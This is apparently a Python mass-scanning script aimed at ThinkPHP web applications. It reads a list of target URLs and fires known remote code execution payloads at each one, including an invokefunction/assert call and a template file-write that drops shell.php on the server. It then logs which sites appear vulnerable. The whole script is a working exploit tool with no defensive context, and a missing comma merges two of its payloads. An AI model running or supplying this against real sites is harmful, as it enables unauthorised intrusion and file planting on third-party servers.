import requests

urls = open('url.txt')

exp = ['/index.php?s=index/think\\request/input?data[]=phpinfo()&filter=assert',
       '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
       '/index.php?s=index/\\think\\template\driver\\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>',
       '/index.php?s=index/\\think\\template\driver\\file/write?cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E',
       '/index.php?s=/index/index/xxx/${@phpinfo()}'#thinkphp2.x
       '/index.php/Index/index/name/$%7B@phpinfo%28%29%7D'
       ]

# print(urls.read())
for url_n in urls:
    for i in exp:
        url = url_n.rstrip("\n")
        payload = url + str(i)
        try:
            response = requests.get(payload,verify=False,timeout=2)
            if 'PHP Version'in response.text:
                with open('洞.txt', 'a')as f:
                    f.write(str(payload) + '\n')
                print('\n[+]漏洞：',payload,'\n')
                break
            elif 'thinkphp'in response.text:
                with open('1.txt', 'a')as f:
                    f.write(str(url) + '\n')
                print('\n[-]其他版本：', url, '\n')
                break
        except:
            pass

